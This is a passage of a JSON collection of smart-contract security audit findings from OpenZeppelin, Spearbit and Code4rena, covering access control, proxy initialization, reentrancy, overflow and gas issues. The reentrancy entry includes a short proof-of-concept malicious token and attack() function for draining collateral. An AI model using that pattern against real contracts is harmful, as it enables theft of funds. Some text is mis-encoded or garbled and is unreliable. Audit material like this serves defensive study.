49](https://github.com/forta-protocol/forta-token/pull/49/commits/11bb25a9034f19be44315203713bf94d138698b8).*",
      "summary": "\nThe ScannerRegistryCore contract is used to register and mint new scanners. These functions are meant to be called by either the scannerâ€™s address, the trusted forwarder, or the admin. However, the _register function was marked as public, meaning that any user could register a scanner in the same way as the admin. To prevent this, the visibility of the _register function was changed to internal. This issue has been fixed in commit 11bb25a9034f19be44315203713bf94d138698b8 in pull request 49.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "6858",
      "title": "Inefï¬cient initialization of minimal proxy implementation",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **File Locations**: \n  - `BondFactory.sol#L71`\n  - `deploy_bond_factory.ts#L24`\n\n## Description\nThe Bond contract uses a minimal proxy pattern when deployed by `BondFactory`. The proxy pattern requires a special `initialize` method to be called to set the state of each cloned contract. Nevertheless, the implementation contract can be left uninitialized, giving an attacker the opportunity to invoke the initialization.\n\n```solidity\nconstructor() {\n    tokenImplementation = address(new Bond());\n    _grantRole(DEFAULT_ADMIN_ROLE, _msgSender());\n}\n```\n\nAfter reporting the issue, it was discovered that a separate (not merged) development branch implements a deployment script that initializes the Bond implementation contract after the main deployment of `BondFactory`, leaving a narrow window for the attacker to leverage this issue and reducing the impact significantly.\n\n```typescript\nconst implementationContract = (await ethers.getContractAt(\n    \"Bond\",\n    await factory.tokenImplementation()\n)) as Bond;\n\ntry {\n    await waitUntilMined(\n        await implementationContract.initialize(\n            \"Placeholder Bond\",\n            \"BOND\",\n            deployer,\n            THREE_YEARS_FROM_NOW_IN_SECONDS,\n            \"0x0000000000000000000000000000000000000000\",\n            \"0x0000000000000000000000000000000000000001\",\n            ethers.BigNumber.from(0),\n            ethers.BigNumber.from(0),\n        )\n    );\n} catch (e) {\n    console.log(\"Is the contract already initialized?\");\n    console.log(e);\n}\n```\n\nDue to the fact that the initially reviewed code did not have the proper initialization for the Bond implementation (as it was an unmerged branch) and because in case of a successful exploitation the impact on the system remains minimal, this finding is marked as low risk. It is not necessary to create a separate transaction and initialize the storage of the implementation contract to prevent unauthorized initialization.\n\n## Recommendation\nOpenZeppelinâ€™s minimal proxy pattern implements a more efficient (less gas) and elegant way to lock the implementation contract by simply invoking `_disableInitializers()`, thus this solution is recommended instead of the current mechanism.\n\n## Porter\nImplemented in PR #262.\n\n## Spearbit\nAcknowledged, recommendation has been implemented.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Porter Finance",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Porter-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "DefSec",
        "Satyam Agrawal",
        "Brock Elmore"
      ]
    },
    {
      "id": "6857",
      "title": "Missing two-step transfer ownership pattern",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n`Bond.sol#L28`\n\n## Description\nAfter a bond is created, its ownership is transferred to the wallet which invoked the `createBond` function. However, this ownership can later be transferred to anyone at any time, or the `renounceOwnership` function can be called. The Bond contract utilizes the Ownable OpenZeppelin contract, which is a simple mechanism to transfer ownership without supporting a two-step ownership transfer pattern. OpenZeppelin describes Ownable as:\n\n> Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account.\n\nThis simpler mechanism can be useful for quick tests, but projects with production concerns are likely to outgrow it. Ownership transfer is a critical operation, and transferring it to an inaccessible wallet or renouncing ownership by mistake can effectively lock the collateral in the contract forever.\n\n## Recommendation\nIt is recommended to implement a two-step transfer ownership mechanism, where ownership is transferred and later claimed by a new owner to confirm the whole process and prevent a lockout. Because the OpenZeppelin ecosystem does not provide such an implementation, it has to be developed in-house. For inspiration, BoringOwnable can be considered. However, it is crucial to ensure it is well tested, especially if it is integrated with other OpenZeppelin contracts used by the project.\n\n## Acknowledgements\n- **Porter:** Confirms and accepts the risks. The team will consider two-step ownership transfer for future contracts.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Porter Finance",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Porter-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "DefSec",
        "Satyam Agrawal",
        "Brock Elmore"
      ]
    },
    {
      "id": "6856",
      "title": "burn() and burnFrom() allow users to lose their bonds",
      "impact": "LOW",
      "content": "## Security Analysis Report\n\n## Severity: Low Risk\n\n### Context\nBond#L31\n\n### Description\nThe Bond contract inherits from `ERC20BurnableUpgradeable`. The contract `Bond` is defined as follows:\n\n```solidity\ncontract Bond is IBond, OwnableUpgradeable, ERC20BurnableUpgradeable {\n```\n\nThis exposes the `burn()` and `burnFrom()` functions to users who could get their bonds burned due to an error or a front-end attack.\n\n### Recommendation\nConsider:\n- Implementing an `onlyOwner` guard inside `burn()` because only the owner needs to be able to burn their bonds if these are not bought by any lenders.\n- Adding any restrictions to the `burnFrom(address account, uint256 amount)` function, which has to be considered in context with the refinancing plan.\n\n### Analysis\n\n**Porter:** Due to the low risk attack vector and additional complexity, weâ€™ve decided to not restrict `burn()` and `burnFrom()` functions.\n\n**Spearbit:** Acknowledged, recommendations have not been implemented.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Porter Finance",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Porter-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "DefSec",
        "Satyam Agrawal",
        "Brock Elmore"
      ]
    },
    {
      "id": "6855",
      "title": "Reentrancy in withdrawExcessCollateral() and withdrawExcessPayment() functions.",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n## Severity: Medium Risk\n\n### Context\n- `Bond.sol#L212`\n- `Bond.sol#233`\n\n### Description\nThe functions `withdrawExcessCollateral()` and `withdrawExcessPayment()` enable the caller to withdraw excess collateral and payment tokens, respectively. Both functions are guarded by an `onlyOwner` modifier, limiting their access to the owner of the contract.\n\n```solidity\nfunction withdrawExcessCollateral(uint256 amount, address receiver) external onlyOwner\n```\n\n```solidity\nfunction withdrawExcessPayment(address receiver) external onlyOwner\n```\n\nWhen transferring tokens, the execution flow is handed over to the token contract. Therefore, if a malicious token manages to call the ownerâ€™s address, it can also call these functions again to withdraw more tokens than required. \n\nAs an example, consider the following case where the collateral tokenâ€™s `transferFrom()` function calls the ownerâ€™s address:\n\n```solidity\nfunction transferFrom(\n    address from,\n    address to,\n    uint256 amount\n) public virtual override returns (bool) {\n    if (reenter) {\n        reenter = false;\n        owner.attack(bond, amount);\n    }\n    address spender = _msgSender();\n    _spendAllowance(from, spender, amount);\n    _transfer(from, to, amount);\n    return true;\n}\n```\n\nAnd the owner contract has a function:\n\n```solidity\nfunction attack(address _bond, uint256 _amount) external {\n    IBond(_bond).withdrawExcessCollateral(_amount, address(this));\n}\n```\n\nWhen `withdrawExcessCollateral()` is called by the owner, it allows them to withdraw double the amount via reentrancy.\n\n### Recommendation\nConsider applying the `nonReentrant` modifier on both of these functions.\n\n### Porter\nImplemented in PR #284.\n\n### Spearbit\nAcknowledged, recommendation has been implemented.",
      "summary": "\nThis bug report is about the withdrawExcessCollateral() and withdrawExcessPayment() functions in the Bond.sol contract. These functions are only accessible to the owner of the contract, but a malicious token can call the owner's address and call these functions again to withdraw more tokens than required. This is known as a reentrancy attack. To fix this, the nonReentrant modifier should be applied to both of these functions. This recommendation was implemented in PR #284, and has been acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Porter Finance",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Porter-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "DefSec",
        "Satyam Agrawal",
        "Brock Elmore"
      ]
    },
    {
      "id": "6854",
      "title": "Freeze Redeems if bonds too Large",
      "impact": "MEDIUM",
      "content": "## Risk Assessment\n\n## Severity\n**Medium Risk**\n\n## Context\n`Bond.sol#L309`\n\n## Description\nIssuing too many bonds can result in users being unable to redeem them. This is caused by arithmetic overflow in the `previewRedeemAtMaturity` function. \n\nIf a userâ€™s `bonds` and `paidAmount` (or `bonds * nonPaidAmount`) product is greater than `2**256`, it will overflow, reverting all attempts to redeem bonds.\n\n## Recommendation\nImplement a safety check in the factory as follows:\n\n```solidity\nuint256 _safetyCheck_ = bonds * bonds;\n```\n\nAlternatively, you can do this inside the `initialize` function:\n\n```solidity\nuint256 _safetyCheck_ = maxSupply * maxSupply;\n```\n\nOr change `bonds` in `factory/Bond.initialize` to a type of `uint128`. This ensures that `bonds.mulDivDown(paidAmount, bondSupply)` is always computable without overflow, as `paidAmount` is at most `maxSupply` (set during initialization) and `bonds` is at most `maxSupply` (set during initialization). \n\nThe `bonds * bonds` passing the safety check ensures that redeems remain functional.\n\n## Porter\nImplemented in PR #290.\n\n## Spearbit\nAcknowledged, recommendation has been implemented.",
      "summary": "\nThis bug report is about arithmetic overflow in the previewRedeemAtMaturity function. This occurs when a user's bonds and paidAmount (or bonds * nonPaidAmount) product is greater than 2**256, resulting in users being unable to redeem. To fix this issue, a safety check is recommended to be implemented in the factory. This safety check is either bonds * bonds or maxSupply * maxSupply. This ensures that bonds.mulDivDown(paidAmount, bondSupply) is always computable without overflow. The recommendation has been implemented in PR #290 and has been acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Porter Finance",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Porter-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "DefSec",
        "Satyam Agrawal",
        "Brock Elmore"
      ]
    },
    {
      "id": "42592",
      "title": "[25] `public` functions not called by the contract should be declared `external` instead",
      "impact": "GAS",
      "content": "\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public` and can save gas by doing so.\n\n```solidity\nFile: /contracts/MerkleDropFactory.sol   #1\n\n49       function addMerkleTree(bytes32 newRoot, bytes32 ipfsHash, address tokenAddress, uint tokenBalance) public {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L49>\n\n```solidity\nFile: /contracts/MerkleDropFactory.sol   #2\n\n88       function withdraw(uint treeIndex, address destination, uint value, bytes32[] memory proof) public {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L88>\n\n```solidity\nFile: /contracts/MerkleIdentity.sol   #3\n\n140       function getPrice(uint merkleIndex) public view returns (uint) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L140>\n\n```solidity\nFile: /contracts/MerkleIdentity.sol   #4\n\n152       function isEligible(uint merkleIndex, address recipient, bytes32[] memory proof) public view returns (bool) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L152>\n\n```solidity\nFile: /contracts/MerkleLib.sol   #5\n\n17       function verifyProof(bytes32 root, bytes32 leaf, bytes32[] memory proof) public pure returns (bool) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleLib.sol#L17>\n\n```solidity\nFile: /contracts/MerkleResistor.sol   #6\n\n80       function addMerkleTree(bytes32 newRoot, bytes32 ipfsHash, uint minEndTime, uint maxEndTime, uint pctUpFront, address tokenAddress, uint tokenBalance) public {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L80>\n\n```solidity\nFile: /contracts/MerkleVesting.sol   #7\n\n62       function addMerkleRoot(bytes32 newRoot, bytes32 ipfsHash, address tokenAddress, uint tokenBalance) public {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L62>\n\n```solidity\nFile: /contracts/VoterID.sol   #8\n\n270       function isApprovedForAll(address _address, address operator) public view returns (bool) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L270>\n\n**[illuzen (FactoryDAO) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/95#issuecomment-1122159008):**\n > All duplicates except<br>\n> 2: valid, I guess, but negligible benefit<br>\n> 14: valid, but negligible<br>\n> 15: valid<br>\n> 20: valid\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/95#issuecomment-1146708232):**\n > Issue 21 is QA and is an opinion rather than a clear improvement. The dev may have had reasons for going the route they did.\n> \n> Note to wardens: for deployment gas improvements, unless the improvements are significant and impact final contract size significantly, these optimizations are the least important since they have no impact on the end user of the contract. \n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/95#issuecomment-1157183708):**\n > There were 25 improvements reported. An impact score has been assigned to each. 0 indicates either that the impact is negligible, the improvement is invalid or the item is not actually a gas optimization. 1 indicates a valid but low or negligible improvement and 2 indicates a significant improvement worth serious consideration.\n>   \n> | |Title|Impact|\n> |-|:-|:-:|\n> | 1 | `for`-loops should be broken out of earlier | 2 |\n> | 2 | Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate | 2 |\n> | 3 | State variables only set in the constructor should be declared `immutable` | 1 |\n> | 4 | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 1 |\n> | 5 | State variables should be cached in stack variables rather than re-reading them from storage | 1 |\n> | 6 | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 1 |\n> | 7 | `internal` functions only called once can be inlined to save gas | 1 |\n> | 8 | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` | 1 |\n> | 9 | `<array>.length` should not be looked up in every loop of a `for`-loop | 2 |\n> | 10 | `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 1 |\n> | 11 | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 2 |\n> | 12 | Not using the named return variables when a function returns, wastes deployment gas | 0 |\n> | 13 | Remove unused local variable | 1 |\n> | 14 | Using `bool`s for storage incurs overhead | 2 |\n> | 15 | `public` library function should be made `private`/`internal` | 1 |\n> | 16 | Move `if-else` to inside function call to save deployment gas | 0 |\n> | 17 | Use a more recent version of solidity | 2 |\n> | 18 | It costs more gas to initialize variables to zero than to let the default of zero be applied | 1 |\n> | 19 | `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too) | 2 |\n> | 20 | Using `private` rather than `public` for constants, saves gas | 1 |\n> | 21 | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 0 |\n> | 22 | Stack variable used as a cheaper cache for a state variable is only used once | 0 |\n> | 23 | `require()` or `revert()` statements that check input arguments should be at the top of the function | 1 |\n> | 24 | Use custom errors rather than `revert()`/`require()` strings to save deployment gas | 2 |\n> | 25 | `public` functions not called by the contract should be declared `external` instead | 1 |\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42591",
      "title": "[24] Use custom errors rather than `revert()`/`require()` strings to save deployment gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. The instances below match or exceed that version\n\n[See original submission](https://github.com/code-423n4/2022-05-factorydao-findings/issues/95) for details.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42590",
      "title": "[23] `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "\nChecks that involve constants should come before checks that involve state variables\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #1\n\n316           require(newTaxPerCapita < 1000, 'Tax too high');\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L316>\n\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #2\n\n112          require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L112>\n\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #3\n\n159          require(pool.id == poolId, 'Uninitialized pool');\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L159>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42589",
      "title": "[22] Stack variable used as a cheaper cache for a state variable is only used once",
      "impact": "GAS",
      "content": "\nIf the variable is only accessed once, it's cheaper to use the state variable directly that one time\n\n```solidity\nFile: /contracts/VoterID.sol   #1\n\n152           address oldOwner = _owner_;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L152>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42588",
      "title": "[21] Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nSaves deployment costs\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #1\n\n182           require(pool.id == poolId, 'Uninitialized pool');\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L182>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #2\n\n234           require(success, 'Token transfer failed');\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L234>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42587",
      "title": "[20] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table\n\n```solidity\nFile: /contracts/MerkleResistor.sol   #1\n\n59       uint constant public PRECISION = 1000000;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L59>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42586",
      "title": "[19] `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "\nSaves 6 gas *PER LOOP*\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #1\n\n115           for (uint i = 0; i < rewardTokenAddresses.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L115>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #2\n\n141           for (uint i = 0; i < pool.rewardFunding.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L141>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #3\n\n168           for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L168>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #4\n\n224           for (uint i = 0; i < rewards.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L224>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #5\n\n249           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L249>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #6\n\n266           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L266>\n\n```solidity\nFile: contracts/MerkleLib.sol   #7\n\n22          for (uint i = 0; i < proof.length; i += 1) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleLib.sol#L22>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42585",
      "title": "[18] It costs more gas to initialize variables to zero than to let the default of zero be applied",
      "impact": "GAS",
      "content": "\n```solidity\nFile: /contracts/MerkleLib.sol   #1\n\n22           for (uint i = 0; i < proof.length; i += 1) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleLib.sol#L22>\n\n```solidity\nFile: /contracts/MerkleResistor.sol   #2\n\n176           uint currentWithdrawal = 0;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L176>\n\n```solidity\nFile: /contracts/MerkleVesting.sol   #3\n\n150           uint currentWithdrawal = 0;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L150>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #4\n\n115           for (uint i = 0; i < rewardTokenAddresses.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L115>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #5\n\n141           for (uint i = 0; i < pool.rewardFunding.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L141>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #6\n\n168           for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L168>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #7\n\n224           for (uint i = 0; i < rewards.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L224>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #8\n\n249           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L249>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #9\n\n266           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L266>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42584",
      "title": "[17] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n```solidity\nFile: /contracts/FixedPricePassThruGate.sol   #1\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/FixedPricePassThruGate.sol#L3>\n\n```solidity\nFile: /contracts/interfaces/IVoterID.sol   #2\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/interfaces/IVoterID.sol#L3>\n\n```solidity\nFile: /contracts/MerkleDropFactory.sol   #3\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L3>\n\n```solidity\nFile: /contracts/MerkleEligibility.sol   #4\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleEligibility.sol#L3>\n\n```solidity\nFile: /contracts/MerkleIdentity.sol   #5\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L3>\n\n```solidity\nFile: /contracts/MerkleLib.sol   #6\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleLib.sol#L3>\n\n```solidity\nFile: /contracts/MerkleResistor.sol   #7\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L3>\n\n```solidity\nFile: /contracts/MerkleVesting.sol   #8\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L3>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #9\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L3>\n\n```solidity\nFile: /contracts/SpeedBumpPriceGate.sol   #10\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L3>\n\n```solidity\nFile: /contracts/VoterID.sol   #11\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L3>\n\n```solidity\nFile: /interfaces/IVoterID.sol   #12\n\n3   pragma solidity 0.8.9;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/interfaces/IVoterID.sol#L3>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42583",
      "title": "[16] Move `if-else` to inside function call to save deployment gas",
      "impact": "GAS",
